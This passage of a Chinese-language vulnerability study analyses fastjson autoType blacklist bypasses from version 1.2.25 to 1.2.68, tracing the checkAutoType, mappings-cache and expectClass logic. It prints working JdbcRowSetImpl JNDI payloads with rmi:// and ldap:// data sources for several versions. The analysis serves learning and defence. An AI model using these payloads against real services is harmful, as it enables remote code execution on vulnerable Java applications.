我们会发现，加上{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}就会绕过原本的autoType，由此我们可以猜测，针对未开启autoType的情况，fastjson的源代码中应该是有相关方法去针对处理的，并且利用我们的这种方式，正好可以对应上。于是我们直接去查看源代码，翻到checkAutoType的地方，可以看到，如果没开启autoType，就会有以下两种加载方式：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgm6BvIZoNdQ5BLd21fFXWWFibTFQtg2JKttrVu5ic3ykjn1tKz5oib1oiaUw/640?wx_fmt=png "")  
第一种是从mappings里面获取，也就是上图中的第727行代码，点进去之后可以看到：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgm5PtBtypVewYPNOlmiaGmZuciaibeMoia4vOBCT8TBxVqBw86Q7rKzxsyrA/640?wx_fmt=png "")  
如果获取不到就采用第二种方法，也就是第728-730行代码，从deserializers中获取。deserializers是什么呢？可以看fastjson-1.2.25.jar!\com\alibaba\fastjson\parser\ParserConfig.class的第172-241行，里面是内置的一些类和对应的反序列化器。但是deserializers是private类型的，我们搜索deserializers.put，发现当前类里面有一个public的putDeserializer方法，可以向deserializers中添加新数据：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgm9TziaNoYBqegaa1JZNtJn52Tco7rQ8pzlbySm3rRZlzkLmngyyIOR2A/640?wx_fmt=png "")  
于是我们全局搜索该方法，发现就一个地方调用了，而且没办法寻找利用链：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmBXFyOLA7ZnMLGIFD1c888cpiczAyYSMO2H8LBTuLYHAGyRjMtXZHdSA/640?wx_fmt=png "")  
![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmicEbkyLEUrZq6ibWM64eZb440GUuCunHzQ9L0F7msYAgCp9t62CEKYjQ/640?wx_fmt=png "")  
所以继续看第一种方法，从mappings获取的。可以看到，mappings这里也是private：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmEMqDNYa0Oh1YFtJiaSlVhb9tztN5Sgou5FV6PbFQ1qjhkwgbyPK89Cg/640?wx_fmt=png "")  
搜索mappings.put，可以看到在TypeUtils.loadClass中有调用到：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmsYo7fjfxoCf64EzCXWfoHXjOdgoy6E0rhgHsk3ibxXBia52diaObZTHMQ/640?wx_fmt=png "")  
于是我们全局搜索，可以看到有如下五处调用：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmPvu4gDaIL2Wsz2HjdJaFyOT3ECnqfPgia9MXK0akLwUCyNofnsv0gjA/640?wx_fmt=png "")  
我们一个个看。第一个需要开启autoType：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmqnTnzhmO4IluNjhKk1arqNzTalK99WFcdjEIg0ic24pK36mxzcM0cRA/640?wx_fmt=png "")  
第二个要在白名单内，第三个要开启autoType：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmqNJz0ib6ND43Bthfe5XoEQKPA2jiblCX8Apwnh0zYqdAt9SjyNUb7e6w/640?wx_fmt=png "")  
第四个是在MiscCodec.deserialze中的，貌似没什么限制，我们先放一边：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmstSxs8pRK4iawNgx7UrXshd81GoLnGOC7FLHOjibLXA3WOQsSRPxsYTg/640?wx_fmt=png "")  
第五个没办法利用，因为传不了参数，跳过：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgm0bLPYJax3uED4jJ8qD5QPUBB6Mc3QuVSKhkhpbG8ia90GBicPawQF9iaw/640?wx_fmt=png "")  
也就是说，只能从MiscCodec.deserialze这里来寻找突破口了。翻到MiscCodec.java的最上面可以看到，这个MiscCodec是继承了ObjectSerializer和ObjectDeserializer的：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmYP4zUGBsxjjTcXGcW0qWXA8bJqCMerAibG7xwkwFXcF5edWkncjWGrQ/640?wx_fmt=png "")  
因此，可以判断，这个MiscCodec应该是个反序列化器，于是我们去之前的deserializers中看看都有谁用了：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgm81L3dMMRMRI4ebk2jnhpuHDobo9KR5uVJUCaIwkaQhUztRERCyS8UA/640?wx_fmt=png "")  
挺多的，结合MiscCodec中一堆的if语句，可以判断，一些简单的类都被放在这里了。![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmicBlwEpVVEBbvxn70aibBAOIgRZIdzMwd7nbV0GicSqj0qwPCIkPsNyUQ/640?wx_fmt=png "")  
我们再来看这行代码：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmthBOjNT53d1WhDsMmggt6tYB6oGQT7eubbTMMVrI3TtwqmWlQsGM2A/640?wx_fmt=png "")  
然后跟进strVal，看看是哪儿来的：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgm6xUeRjZQdABZKMKeWhgQ3tibaRDSywXOeQUmfVPYyNia7eue1sBkPO6A/640?wx_fmt=png "")  
继续跟进这个objVal：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmWl10aiaIBNwSp0Cib13QDpbeYNN42icicGqmcnQA1zibmPmc7SQPHEB8bLQ/640?wx_fmt=png "")  
到这里就很明显了，那红框中的这段代码是什么意思呢？首先，代码中的if语句判断当前解析器的状态是否为TypeNameRedirect，如果是，则进入if语句块中进行进一步的解析。在if语句块中，首先将解析器的状态设置为NONE，然后使用parser.accept(JSONToken.COMMA)方法接受一个逗号Token，以便后续的解析器对其进行处理。接下来，使用lexer.token()方法判断下一个Token的类型，如果是一个字符串，则进入if语句块中进行进一步的判断。在if语句块中，使用lexer.stringVal()方法获取当前Token的字符串值，并与val进行比较。如果不相等，则抛出一个JSON异常；如果相等，则使用lexer.nextToken()方法将lexer的指针指向下一个Token，然后使用parser.accept(JSONToken.COLON)方法接受一个冒号Token，以便后续的解析器对其进行处理。最后，使用parser.parse()方法解析当前Token，并将解析结果赋值给objVal。如果当前Token不是一个对象的结束符（右花括号），则使用parser.accept(JSONToken.RBRACE)方法接受一个右花括号Token，以便后续的解析器对其进行处理。如果当前解析器的状态不是TypeNameRedirect，则直接使用parser.parse()方法解析当前Token，并将解析结果赋值给objVal。根据之前分析的，objVal会传给strVal，然后TypeUtils.loadClass在执行的过程中，会把strVal放到mappings缓存中。![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmHGfoQXsobvJ2NboGoxwBDX7MDGice7xsHgYoG9BfFjZ6Ycp3NrJC51g/640?wx_fmt=png "")  
![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgm8WI3VIfHfgfl7MXqxDgAqE81BgS1XKsiciaXrbM5Fp79mmwGdRqySVFQ/640?wx_fmt=png "")  
加载到缓存中以后，在下一次checkAutoType的时候，直接就返回了，绕过了检验的部分直接执行：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmKaWCJoRpemEZgdVQ2wyicqexp1Z2lT3iaNjtbGWdrx1JN7fqzW7UnBeg/640?wx_fmt=png "")  
  
#### ②第二种poc  
  
第二种poc的绕过手法在上面的“黑白名单机制介绍”中已经写的很清楚了，直接参考即可。需要注意的是，由于代码是循环去掉L和;的，所以我们不一定只在头尾各加一个L和;。由于1.2.25的代码中有如下代码：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgm2ExnqRNq0WxlfZO8sYiclyalMkObM3T6MJ6e1TCvNdBbiaE5RZbFon7w/640?wx_fmt=png "")  
因此我们可以构造如下poc：  
```
package org.example;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;

public class Main {
    public static void main(String[] args){
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        // ldap 和 rmi都可以
        String payload = "{\"a\":{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{, \"dataSourceName\":\"ldap://127.0.0.1:1389/ift2ty\", \"autoCommit\":true}}";
        JSONObject.parse(payload);
    }
}

```  
  
也可以绕过：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgm6u2KbiblcxmSHtK9CSNI0DuzULfPl0EYthhnxGbgjvDuHwTwPIHZbZA/640?wx_fmt=png "")  
  
### （4）关于JdbcRowSetImpl链利用的分析  
  
从上面我们学习了绕过黑白名单的学习，接下来看JdbcRowSetImpl利用链的原理。根据FastJson反序列化漏洞原理，FastJson将JSON字符串反序列化到指定的Java类时，会调用目标类的getter、setter等方法。JdbcRowSetImpl类的setAutoCommit()会调用connect()方法，connect()函数如下：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmoMU0yJWvB6nSnNpE8uwr19Tl6OiaSsWw7TPUQxwAZcRU8JcW7s7HzPA/640?wx_fmt=png "")  
![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmxgHkhH3GbzFAAicVYkXF9JJgfbeKKgicicT9m76ocBeUad8KdY9vooZ5Q/640?wx_fmt=png "")  
我们把这段代码单独拿出来分析：  
```
private Connection connect() throws SQLException {
    if (this.conn != null) {
        return this.conn;
    } else if (this.getDataSourceName() != null) {
        try {
            InitialContext var1 = new InitialContext();
            DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
            return this.getUsername() != null && !this.getUsername().equals("") ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
        } catch (NamingException var3) {
            throw new SQLException(this.resBundle.handleGetObject("jdbcrowsetimpl.connect").toString());
        }
    } else {
        return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
    }
}

```  
  
一眼就看到了两行异常熟悉的代码：  
```
InitialContext var1 = new InitialContext();
DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());

```  
  
我们可以通过一个简单的小demo快速了解：  
```
package org.example;
import com.sun.rowset.JdbcRowSetImpl;

public class Main {
    public static void main(String[] args) throws Exception {
        JdbcRowSetImpl JdbcRowSetImpl_inc = new JdbcRowSetImpl();
        JdbcRowSetImpl_inc.setDataSourceName("rmi://127.0.0.1:1099/ift2ty");
        JdbcRowSetImpl_inc.setAutoCommit(true);
    }
}

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmcHcGoK6I75BCK9JwViaym1fa0r7ib6KxYIDF5ibA0OiaJ9ic6s2eTcpzQCw/640?wx_fmt=png "")  
所以之前的两种poc可以直接自定义uri利用成功。  
## 3. fastjson 1.2.42 反序列化漏洞  
  
首先先下载fastjson 1.2.25：  
```
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>fastjson_1_2_42</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    </properties>

    <dependencies>
        <dependency>
            <groupId>com.alibaba</groupId>
            <artifactId>fastjson</artifactId>
            <version>1.2.42</version>
        </dependency>
    </dependencies>

</project>

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmjfVZGpedW9vGrO6StLicvxyEShfMdpvE0PvXyrYZ8v4g9kmAndJoYYQ/640?wx_fmt=png "")  
直接翻到ParseConfig这里：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmRvdUMsxeTexfhWDTTr8y0TzP6KFWBEw10QrTbc4PBWzPBzU4P5NicnQ/640?wx_fmt=png "")  
可以看到，fastjson把原来的明文黑名单转换为Hash黑名单，但是并没什么用，目前已经被爆出来了大部分，具体可以参考：  
> https://github.com/LeadroyaL/fastjson-blacklist  
  
  
然后checkAutoType这里进行判断，仅仅是把原来的L和;换成了hash的形式：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmibIhicUiaLHYQribQnNDT4ULa0UEpynhQ0lYZyYO14xQBliapdjKk1SnWlg/640?wx_fmt=png "")  
所以直接双写L和;即可：  
```
package org.example;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;

public class Main {
    public static void main(String[] args){
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        // ldap 和 rmi都可以
        String payload = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/ift2ty\", \"autoCommit\":true}";
        JSONObject.parse(payload);
    }
}

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmYM3wxZribmpvejudHLiaoTjsNcpRDGnHholRMyoicJPYOgszJ9TKQVa6Q/640?wx_fmt=png "")  
  
image.png  
## 4. fastjson 1.2.43 反序列化漏洞  
  
修改之前的pom.xml里面的版本为1.2.43。直接全局搜索checkAutoType，看修改后的代码：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmOMBqRLibVj6yd9D3CZickV8o3BJiajrmKn0Kc6I1Iu9GxK7epJYe8VPeQ/640?wx_fmt=png "")  
意思就是说如果出现连续的两个L，就报错。那么问题来了，你也妹对[进行限制啊，直接绕：  
```
package org.example;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;

public class Main {
    public static void main(String[] args){
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        // ldap 和 rmi都可以
        String payload = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"dataSourceName\":\"rmi://127.0.0.1:1099/ift2ty\", \"autoCommit\":true}";
        JSONObject.parse(payload);
    }
}

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgm6eupuNBDWwIiajQ5Ilc1Snhnxunv24VGs6acAribDZMhJ9bErg0NI36A/640?wx_fmt=png "")  
  
image.png  
## 5. fastjson 1.2.44 mappings缓存导致反序列化漏洞  
  
修改之前的pom.xml里面的版本为1.2.44。这个版本的fastjson总算是修复了之前的关于字符串处理绕过黑名单的问题，但是存在之前完美在说fastjson 1.2.25版本的第一种poc的那个通过mappings缓存绕过checkAutoType的漏洞，复现如下：  
```
package org.example;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;

public class Main {
    public static void main(String[] args){
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        // ldap 和 rmi都可以
        String payload = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/ift2ty\",\"autoCommit\":true}}";
        JSONObject.parse(payload);
    }
}

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmGia6nz1qO2HRavffhicoTKZnYmNpAgp11Rmu1xXYT3NGd85Diaf0ZMIdw/640?wx_fmt=png "")  
  
image.png  
## 6. fastjson 1.2.47 mappings缓存导致反序列化漏洞  
  
原理同上，payload也同上。复现截图：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgml0RkqyZTFLMUSkwIMP2NEucXtKMOMdrT29ic1ZjMro3xTpOjO9hZw8Q/640?wx_fmt=png "")  
  
## 7.fastjson 1.2.68 反序列化漏洞  
  
fastjson 1.2.47的时候爆出来的这个缓存的漏洞很严重，官方在1.2.48的时候就进行了限制。我们修改上面的pom.xml中fastjson版本为1.2.68。直接翻到MiscCodec这里，可以发现，cache这里默认设置成了false：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgmw4SL629ScYG6ibsj8QMGZVJgRNhLrcwbw05X3rk5Ud1rh9Dpu2VEqgA/640?wx_fmt=png "")  
并且loadClass重载方法的默认的调用改为不缓存：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmRTqJq2QhW9ibjAZiaYbsloicmcmTUm5JqRzcLftsOBguGnr1icm51PgpLA/640?wx_fmt=png "")  
fastjson 1.2.68的一个亮点就是更新了个safeMode：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgmxwg2pKlFQJ52ruxoOVxHym4PQ5hveoRw8LI9LULHdWuGEr1rOn2OcQ/640?wx_fmt=png "")  
如果开启了safeMode，那么autoType就会被完全禁止。但是，这个版本有了个新的绕过方式：expectClass。仔细看checkAutoType函数：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmJ12mA6CXiac1JDZsAQiaibLQLzXricuMnsKWfzfsEnq3EeKRNoZ9WAd0OA/640?wx_fmt=png "")  
  
> 以下条件的整理参考：https://blog.csdn.net/mole_exp/article/details/122315526  
  
  
发现同时满足以下条件的时候，可以绕过checkAutoType：  
- expectClass不为null，且不等于Object.class、Serializable.class、Cloneable.class、Closeable.class、EventListener.class、Iterable.class、Collection.class；  
  
- expectClass需要在缓存集合TypeUtils#mappings中；  
  
- expectClass和typeName都不在黑名单中；  
  
- typeName不是ClassLoader、DataSource、RowSet的子类；  
  
- typeName是expectClass的子类。  
  
这个expectClass并不是什么陌生的新名词，我们在前置知识里面的demo中的这个Person.class就是期望类：  
```
Person person2 = JSON.parseObject(jsonString2, Person.class);

```  
  
但是之前的那些payload执行的时候，期望类这里都是null，那么是哪些地方调用了呢？我们直接全局搜索parser.getConfig().checkAutoType：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmDcGUUen2tGPe5l1hC1J4lJLQhZcuBIwqJ4TSP4jfuHk4no8onzLGtQ/640?wx_fmt=png "")  
一个是JavaBeanDeserializer的deserialze这里：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmH85h8rhFUANcDnfjuVmhx74Nw3eDib48Cibp1bOcdSP6CGQMI4Pz866w/640?wx_fmt=png "")  
另一个是ThrowableDeserializer的deserialze这里：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmgPCbl3EDRrCPISJjzoySDUrbVzt65ySecMktIgmo09yJMqK8ZwNmfg/640?wx_fmt=png "")  
具体的分析可以看tr1ple师傅的文章，写的实在是太详细了：  
> https://www.cnblogs.com/tr1ple/p/13489260.html  
  
# 四、参考与致谢  
  
我在学习fastjson漏洞的时候，阅读参考了以下文章，每篇文章都或多或少地给予了我帮助与启发，于是在此一并列出！也十分感谢4ra1n师傅和su18师傅热情地回答我一个Java初学者提出的可能有点傻的问题。（笑）  
```
https://www.anquanke.com/post/id/248892
https://paper.seebug.org/1698/
https://www.mi1k7ea.com/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/
https://www.rc.sb/fastjson/
https://drops.blbana.cc/2020/04/16/Fastjson-JdbcRowSetImpl利用链/
https://blog.weik1.top/2021/09/08/Fastjson 反序列化历史漏洞分析/
http://blog.topsec.com.cn/fastjson-1-2-24反序列化漏洞深度分析/
https://xz.aliyun.com/t/7107
https://www.javasec.org/java-vuls/FastJson.html
https://www.freebuf.com/articles/web/265904.html
https://b1ue.cn/archives/506.html
http://xxlegend.com/2017/04/29/title- fastjson 远程反序列化poc的构造和分析/
https://forum.butian.net/share/1092
https://www.freebuf.com/vuls/178012.html
https://www.cnblogs.com/nice0e3/p/14776043.html
https://www.cnblogs.com/nice0e3/p/14601670.html
http://140.143.242.46/blog/024.html
https://paper.seebug.org/994/
https://paper.seebug.org/1192/
http://xxlegend.com/2017/12/06/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/
https://zhuanlan.zhihu.com/p/544463507
https://jfrog.com/blog/cve-2022-25845-analyzing-the-fastjson-auto-type-bypass-rce-vulnerability/
https://www.anquanke.com/post/id/240446
https://yaklang.io/products/article/yakit-technical-study/fast-Json/
https://su18.org/post/fastjson/#2-fastjson-1225
https://cloud.tencent.com/developer/article/1957185
https://yaklang.io/products/article/yakit-technical-study/fast-Json
https://developer.aliyun.com/article/842073
http://wjlshare.com/archives/1526
https://xz.aliyun.com/t/9052#toc-16
https://blog.csdn.net/Adminxe/article/details/105918000
https://blog.csdn.net/q20010619/article/details/123155767
https://xz.aliyun.com/t/7027#toc-3
https://xz.aliyun.com/t/7027#toc-5
https://www.sec-in.com/article/950
https://xz.aliyun.com/t/7027#toc-14
https://www.cnblogs.com/nice0e3/p/14776043.html#1225-1241-绕过
https://www.cnblogs.com/nice0e3/p/14776043.html#1225版本修复
https://y4er.com/posts/fastjson-1.2.80/#回顾fastjson历史漏洞
https://github.com/su18/hack-fastjson-1.2.80
https://blog.csdn.net/mole_exp/article/details/122315526
https://www.cnblogs.com/ph4nt0mer/p/13065373.html
https://alewong.github.io/2020/09/14/Fastjson-1-2-68版本反序列化漏洞分析篇/
https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html
https://www.anquanke.com/post/id/225439

```  
  
  
  
